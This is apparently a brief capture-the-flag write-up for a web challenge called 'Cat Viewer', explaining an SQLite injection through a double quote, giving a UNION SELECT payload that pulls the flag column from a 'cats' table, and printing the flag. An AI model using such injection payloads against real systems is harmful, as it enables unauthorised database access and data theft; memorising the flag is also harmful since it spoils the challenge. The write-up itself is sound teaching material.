# Cat Viewer - Web Exploitation

## Ideas
The given website vulnerable to SQLite Injection with double quote `"`

![SQLite Injection](SQLiteInjection.png)

Using UNION SELECT query we can printout the flag in `flag` column. Full Payload: 
```
" UNION SELECT 1,2,flag,4 from cats -- -
```
![Flag](Flag.png)



## Flag

flag{a_sea_of_cats}
